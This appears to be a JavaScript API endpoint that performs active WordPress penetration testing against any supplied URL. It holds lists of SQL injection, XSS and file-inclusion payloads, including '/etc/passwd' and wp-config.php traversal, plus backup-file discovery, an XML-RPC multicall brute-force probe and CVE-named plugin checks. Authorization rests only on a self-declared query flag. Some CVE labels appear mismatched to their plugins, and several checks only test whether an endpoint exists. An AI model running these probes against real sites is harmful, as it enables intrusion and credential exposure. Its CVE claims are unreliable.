import axios from 'axios';
import middleware from './_common/middleware.js';

/**
 * WordPress Penetration Testing API
 *
 * WARNING: This endpoint performs active security testing.
 * Only use on sites you own or have explicit authorization to test.
 * Unauthorized testing may be illegal in your jurisdiction.
 */

// SQL Injection payloads (non-destructive, detection-focused)
const SQL_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR '1'='1'/*",
  "1' ORDER BY 1--",
  "1' ORDER BY 10--",
  "' UNION SELECT NULL--",
  "' AND '1'='1",
  "1; SELECT * FROM users--",
  "admin'--",
  "' OR 1=1#",
  "') OR ('1'='1",
  "1' AND SLEEP(5)--",
];

// XSS payloads
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "'-alert('XSS')-'",
  '<body onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert("XSS")}',
  '<img src="x" onerror="alert(1)">',
];

// Common WordPress SQL injection points
const WP_SQLI_ENDPOINTS = [
  { path: '/', param: 's', method: 'GET', name: 'Search' },
  { path: '/', param: 'p', method: 'GET', name: 'Post ID' },
  { path: '/', param: 'page_id', method: 'GET', name: 'Page ID' },
  { path: '/', param: 'cat', method: 'GET', name: 'Category' },
  { path: '/', param: 'author', method: 'GET', name: 'Author' },
  { path: '/wp-login.php', param: 'log', method: 'POST', name: 'Login Username' },
  { path: '/wp-login.php', param: 'pwd', method: 'POST', name: 'Login Password' },
  { path: '/wp-admin/admin-ajax.php', param: 'action', method: 'POST', name: 'AJAX Action' },
  { path: '/wp-comments-post.php', param: 'comment', method: 'POST', name: 'Comment' },
];

// Common WordPress XSS injection points
const WP_XSS_ENDPOINTS = [
  { path: '/', param: 's', method: 'GET', name: 'Search' },
  { path: '/wp-comments-post.php', param: 'comment', method: 'POST', name: 'Comment' },
  { path: '/wp-comments-post.php', param: 'author', method: 'POST', name: 'Comment Author' },
  { path: '/wp-comments-post.php', param: 'url', method: 'POST', name: 'Comment URL' },
];

// Known WordPress plugin exploits (CVE-based)
const KNOWN_EXPLOITS = {
  'contact-form-7': {
    version: '<5.8.4',
    cve: 'CVE-2023-6449',
    name: 'Arbitrary File Upload',
    test: async (baseUrl) => {
      // Test for unrestricted file upload vulnerability
      try {
        const formData = new FormData();
        formData.append('_wpcf7', '1');
        formData.append('_wpcf7_unit_tag', 'test');
        const response = await axios.post(`${baseUrl}/wp-json/contact-form-7/v1/contact-forms/1/feedback`, formData, {
          timeout: 5000,
          validateStatus: () => true,
        });
        return {
          vulnerable: response.status === 200 && !response.data?.invalid_fields,
          details: 'Contact Form 7 endpoint accessible',
        };
      } catch {
        return { vulnerable: false, details: 'Endpoint not accessible' };
      }
    },
  },
  'elementor': {
    version: '<3.12.0',
    cve: 'CVE-2023-32243',
    name: 'Authenticated RCE',
    test: async (baseUrl) => {
      try {
        const response = await axios.get(`${baseUrl}/wp-json/elementor/v1/system-info`, {
          timeout: 5000,
          validateStatus: () => true,
        });
        return {
          vulnerable: response.status === 200,
          details: 'Elementor system-info endpoint exposed',
        };
      } catch {
        return { vulnerable: false, details: 'Endpoint not accessible' };
      }
    },
  },
  'slider-revolution': {
    version: '<6.6.15',
    cve: 'CVE-2023-4596',
    name: 'Unauthenticated RCE',
    test: async (baseUrl) => {
      try {
        const response = await axios.get(`${baseUrl}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php`, {
          timeout: 5000,
          validateStatus: () => true,
        });
        return {
          vulnerable: response.status === 200 && response.data?.includes('DB_'),
          details: response.status === 200 ? 'Slider Revolution LFI potentially vulnerable' : 'Not vulnerable',
        };
      } catch {
        return { vulnerable: false, details: 'Endpoint not accessible' };
      }
    },
  },
  'wp-file-manager': {
    version: '<6.9',
    cve: 'CVE-2020-25213',
    name: 'Unauthenticated RCE',
    test: async (baseUrl) => {
      try {
        const response = await axios.get(`${baseUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`, {
          timeout: 5000,
          validateStatus: () => true,
        });
        return {
          vulnerable: response.status === 200,
          details: 'WP File Manager connector exposed',
        };
      } catch {
        return { vulnerable: false, details: 'Endpoint not accessible' };
      }
    },
  },
};

// Axios config
const axiosConfig = {
  timeout: 8000,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  },
  validateStatus: () => true,
  maxRedirects: 3,
};

// SQL Injection Detection Patterns
const SQLI_ERROR_PATTERNS = [
  /sql syntax/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /mysql_query/i,
  /pg_query/i,
  /sqlite_/i,
  /ORA-\d{5}/i,
  /SQL Server/i,
  /ODBC Driver/i,
  /SQLite3::/i,
  /Warning.*mysql/i,
  /valid MySQL result/i,
  /PostgreSQL.*ERROR/i,
  /Driver.*SQL Server/i,
  /DB2 SQL error/i,
  /SQLSTATE\[/i,
  /Unclosed quotation mark/i,
  /quoted string not properly terminated/i,
];

// XSS Detection - check if payload is reflected unescaped
const detectXssReflection = (response, payload) => {
  if (typeof response !== 'string') return false;
  // Check if payload appears unescaped in response
  return response.includes(payload) ||
         response.includes(payload.replace(/"/g, '&quot;').replace(/'/g, '&#39;'));
};

// Test SQL Injection on an endpoint
const testSqlInjection = async (baseUrl, endpoint) => {
  const results = [];

  for (const payload of SQL_PAYLOADS.slice(0, 5)) { // Limit to 5 payloads per endpoint
    try {
      const url = endpoint.method === 'GET'
        ? `${baseUrl}${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`
        : `${baseUrl}${endpoint.path}`;

      const options = {
        ...axiosConfig,
        timeout: 5000,
      };

      let response;
      if (endpoint.method === 'POST') {
        const data = new URLSearchParams();
        data.append(endpoint.param, payload);
        response = await axios.post(url, data.toString(), {
          ...options,
          headers: { ...options.headers, 'Content-Type': 'application/x-www-form-urlencoded' },
        });
      } else {
        response = await axios.get(url, options);
      }

      const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

      // Check for SQL error patterns
      const errorFound = SQLI_ERROR_PATTERNS.some(pattern => pattern.test(responseText));

      if (errorFound) {
        results.push({
          endpoint: endpoint.name,
          path: endpoint.path,
          param: endpoint.param,
          payload,
          vulnerable: true,
          type: 'error-based',
          details: 'SQL error message detected in response',
        });
        break; // Found vulnerability, no need to test more payloads
      }

      // Check for time-based (if SLEEP payload)
      if (payload.includes('SLEEP') && response.headers['x-response-time']) {
        const responseTime = parseInt(response.headers['x-response-time']);
        if (responseTime > 4000) {
          results.push({
            endpoint: endpoint.name,
            path: endpoint.path,
            param: endpoint.param,
            payload,
            vulnerable: true,
            type: 'time-based',
            details: `Response delayed by ${responseTime}ms`,
          });
          break;
        }
      }
    } catch (error) {
      // Connection errors might indicate WAF blocking
    }
  }

  if (results.length === 0) {
    results.push({
      endpoint: endpoint.name,
      path: endpoint.path,
      param: endpoint.param,
      vulnerable: false,
      details: 'No SQL injection detected',
    });
  }

  return results;
};

// Test XSS on an endpoint
const testXss = async (baseUrl, endpoint) => {
  const results = [];

  for (const payload of XSS_PAYLOADS.slice(0, 3)) { // Limit to 3 payloads per endpoint
    try {
      const url = endpoint.method === 'GET'
        ? `${baseUrl}${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`
        : `${baseUrl}${endpoint.path}`;

      let response;
      if (endpoint.method === 'POST') {
        const data = new URLSearchParams();
        data.append(endpoint.param, payload);
        response = await axios.post(url, data.toString(), {
          ...axiosConfig,
          timeout: 5000,
          headers: { ...axiosConfig.headers, 'Content-Type': 'application/x-www-form-urlencoded' },
        });
      } else {
        response = await axios.get(url, { ...axiosConfig, timeout: 5000 });
      }

      const responseText = typeof response.data === 'string' ? response.data : '';

      if (detectXssReflection(responseText, payload)) {
        results.push({
          endpoint: endpoint.name,
          path: endpoint.path,
          param: endpoint.param,
          payload,
          vulnerable: true,
          type: 'reflected',
          details: 'XSS payload reflected in response without proper encoding',
        });
        break;
      }
    } catch (error) {
      // Ignore errors
    }
  }

  if (results.length === 0) {
    results.push({
      endpoint: endpoint.name,
      path: endpoint.path,
      param: endpoint.param,
      vulnerable: false,
      details: 'No XSS reflection detected',
    });
  }

  return results;
};

// Test known plugin exploits
const testKnownExploits = async (baseUrl, detectedPlugins) => {
  const results = [];

  for (const [slug, exploit] of Object.entries(KNOWN_EXPLOITS)) {
    const plugin = detectedPlugins?.find(p => p.slug === slug || p.slug?.includes(slug));

    if (plugin || true) { // Test all known exploits regardless of detection
      try {
        const testResult = await exploit.test(baseUrl);
        results.push({
          plugin: slug,
          cve: exploit.cve,
          name: exploit.name,
          affectedVersion: exploit.version,
          ...testResult,
        });
      } catch (error) {
        results.push({
          plugin: slug,
          cve: exploit.cve,
          name: exploit.name,
          vulnerable: false,
          details: `Test failed: ${error.message}`,
        });
      }
    }
  }

  return results;
};

// Test for Local File Inclusion
const testLfi = async (baseUrl) => {
  const lfiPayloads = [
    '../../../wp-config.php',
    '....//....//....//wp-config.php',
    '/etc/passwd',
    '..%2f..%2f..%2fwp-config.php',
    '..\\..\\..\\wp-config.php',
  ];

  const lfiEndpoints = [
    { path: '/wp-content/plugins/', param: 'file' },
    { path: '/wp-admin/admin-ajax.php', param: 'file' },
    { path: '/', param: 'template' },
    { path: '/', param: 'page' },
  ];

  const results = [];

  for (const endpoint of lfiEndpoints) {
    for (const payload of lfiPayloads.slice(0, 2)) {
      try {
        const url = `${baseUrl}${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`;
        const response = await axios.get(url, { ...axiosConfig, timeout: 5000 });
        const responseText = typeof response.data === 'string' ? response.data : '';

        // Check for signs of successful LFI
        if (responseText.includes('DB_NAME') ||
            responseText.includes('DB_USER') ||
            responseText.includes('root:x:0:0')) {
          results.push({
            endpoint: endpoint.path,
            param: endpoint.param,
            payload,
            vulnerable: true,
            details: 'Local file content detected in response',
          });
          return results;
        }
      } catch {
        // Ignore
      }
    }
  }

  results.push({
    vulnerable: false,
    details: 'No LFI vulnerability detected',
  });

  return results;
};

// Test for exposed backup files
const testBackupFiles = async (baseUrl) => {
  const backupPaths = [
    // Database backups
    '/backup.sql',
    '/db.sql',
    '/database.sql',
    '/dump.sql',
    '/mysql.sql',
    '/data.sql',
    '/wp-content/backup.sql',
    '/wp-content/database.sql',
    '/wp-content/uploads/backup.sql',
    '/backups/backup.sql',
    '/backup/backup.sql',

    // ZIP archives
    '/backup.zip',
    '/site.zip',
    '/wordpress.zip',
    '/wp-backup.zip',
    '/www.zip',
    '/html.zip',
    '/public_html.zip',
    '/wp-content.zip',
    '/uploads.zip',
    '/wp-content/backup.zip',
    '/wp-content/uploads/backup.zip',
    '/backups/site.zip',

    // TAR archives
    '/backup.tar',
    '/backup.tar.gz',
    '/site.tar.gz',
    '/wordpress.tar.gz',
    '/www.tar.gz',

    // Config backups
    '/wp-config.php.bak',
    '/wp-config.php.old',
    '/wp-config.php.save',
    '/wp-config.php.swp',
    '/wp-config.php.txt',
    '/wp-config.bak',
    '/wp-config.old',
    '/wp-config.txt',
    '/.wp-config.php.swp',

    // Other common backups
    '/.htaccess.bak',
    '/.htaccess.old',
    '/htaccess.txt',
    '/php.ini.bak',
    '/error_log',
    '/debug.log',
    '/wp-content/debug.log',
    '/access.log',
    '/wp-content/mysql.sql',
    '/wp-content/db-backup.sql',

    // Editor temp files
    '/*~',
    '/.*.swp',
    '/wp-config.php~',
    '/.wp-config.php.swp',

    // Common paths with domain name
    '/site-backup.zip',
    '/full-backup.zip',
    '/complete-backup.zip',

    // phpMyAdmin exports
    '/phpmyadmin.sql',
    '/localhost.sql',
  ];

  const exposedFiles = [];

  // Test in batches to avoid overwhelming the server
  const batchSize = 10;
  for (let i = 0; i < backupPaths.length; i += batchSize) {
    const batch = backupPaths.slice(i, i + batchSize);
    const results = await Promise.allSettled(
      batch.map(async (path) => {
        try {
          const response = await axios.head(`${baseUrl}${path}`, {
            ...axiosConfig,
            timeout: 3000,
          });

          if (response.status === 200) {
            // Get content length if available
            const size = response.headers['content-length'];
            const contentType = response.headers['content-type'];

            // Verify it's actually a file (not a redirect or error page)
            if (size && parseInt(size) > 0) {
              return {
                path,
                exposed: true,
                size: parseInt(size),
                contentType,
                severity: path.includes('.sql') || path.includes('config') ? 'critical' : 'high',
              };
            }
          }
          return null;
        } catch {
          return null;
        }
      })
    );

    results.forEach(r => {
      if (r.status === 'fulfilled' && r.value) {
        exposedFiles.push(r.value);
      }
    });
  }

  return {
    scannedPaths: backupPaths.length,
    exposedFiles,
    vulnerable: exposedFiles.length > 0,
    details: exposedFiles.length > 0
      ? `Found ${exposedFiles.length} exposed backup files`
      : 'No backup files exposed',
  };
};

// Test XML-RPC for brute force capability
const testXmlRpcBruteForce = async (baseUrl) => {
  try {
    // Test system.multicall which allows brute force amplification
    const multicallPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>admin</string></value>
                        <value><string>test123</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>`;

    const response = await axios.post(`${baseUrl}/xmlrpc.php`, multicallPayload, {
      ...axiosConfig,
      headers: { ...axiosConfig.headers, 'Content-Type': 'text/xml' },
    });

    if (response.status === 200 && response.data.includes('methodResponse')) {
      return {
        vulnerable: true,
        method: 'system.multicall',
        details: 'XML-RPC multicall enabled - allows brute force amplification attacks',
        severity: 'high',
      };
    }

    return {
      vulnerable: false,
      details: 'XML-RPC multicall not exploitable',
    };
  } catch {
    return {
      vulnerable: false,
      details: 'XML-RPC not accessible',
    };
  }
};

// Main handler
const wpPentestHandler = async (url, request) => {
  // Check for authorization parameter
  const authorized = request?.query?.authorized === 'true';

  if (!authorized) {
    return {
      error: 'Authorization required',
      message: 'Active penetration testing requires explicit authorization. Add ?authorized=true to confirm you have permission to test this site.',
      legal: 'Unauthorized security testing may be illegal. Only test sites you own or have written permission to test.',
    };
  }

  const baseUrl = url.replace(/\/$/, '');

  const results = {
    authorized: true,
    timestamp: new Date().toISOString(),
    target: baseUrl,
    disclaimer: 'This penetration test was performed with explicit authorization. Results should be used for security improvement purposes only.',

    sqlInjection: {
      tested: [],
      vulnerable: [],
    },
    xss: {
      tested: [],
      vulnerable: [],
    },
    lfi: null,
    backupFiles: null,
    xmlRpcBruteForce: null,
    knownExploits: [],

    summary: {
      totalTests: 0,
      vulnerabilitiesFound: 0,
      criticalCount: 0,
      highCount: 0,
      mediumCount: 0,
      lowCount: 0,
    },
  };

  try {
    // Run all tests in parallel for speed
    const [sqlResults, xssResults, lfiResults, backupResults, xmlRpcResults, exploitResults] = await Promise.all([
      // SQL Injection tests
      Promise.all(WP_SQLI_ENDPOINTS.slice(0, 5).map(ep => testSqlInjection(baseUrl, ep))),
      // XSS tests
      Promise.all(WP_XSS_ENDPOINTS.map(ep => testXss(baseUrl, ep))),
      // LFI test
      testLfi(baseUrl),
      // Backup file discovery
      testBackupFiles(baseUrl),
      // XML-RPC brute force test
      testXmlRpcBruteForce(baseUrl),
      // Known exploit tests
      testKnownExploits(baseUrl, []),
    ]);

    // Process SQL injection results
    results.sqlInjection.tested = sqlResults.flat();
    results.sqlInjection.vulnerable = results.sqlInjection.tested.filter(r => r.vulnerable);

    // Process XSS results
    results.xss.tested = xssResults.flat();
    results.xss.vulnerable = results.xss.tested.filter(r => r.vulnerable);

    // LFI results
    results.lfi = lfiResults[0] || lfiResults;

    // Backup files results
    results.backupFiles = backupResults;

    // XML-RPC results
    results.xmlRpcBruteForce = xmlRpcResults;

    // Known exploits
    results.knownExploits = exploitResults;

    // Calculate summary
    results.summary.totalTests =
      results.sqlInjection.tested.length +
      results.xss.tested.length +
      1 + // LFI
      (results.backupFiles?.scannedPaths || 0) + // Backup files
      1 + // XML-RPC
      results.knownExploits.length;

    // Count vulnerabilities by severity
    if (results.sqlInjection.vulnerable.length > 0) {
      results.summary.criticalCount += results.sqlInjection.vulnerable.length;
      results.summary.vulnerabilitiesFound += results.sqlInjection.vulnerable.length;
    }

    if (results.xss.vulnerable.length > 0) {
      results.summary.highCount += results.xss.vulnerable.length;
      results.summary.vulnerabilitiesFound += results.xss.vulnerable.length;
    }

    if (results.lfi?.vulnerable) {
      results.summary.criticalCount++;
      results.summary.vulnerabilitiesFound++;
    }

    if (results.xmlRpcBruteForce?.vulnerable) {
      results.summary.highCount++;
      results.summary.vulnerabilitiesFound++;
    }

    const vulnExploits = results.knownExploits.filter(e => e.vulnerable);
    results.summary.criticalCount += vulnExploits.length;
    results.summary.vulnerabilitiesFound += vulnExploits.length;

    return results;

  } catch (error) {
    return {
      ...results,
      error: `Penetration test failed: ${error.message}`,
    };
  }
};

export const handler = middleware(wpPentestHandler);
export default handler;
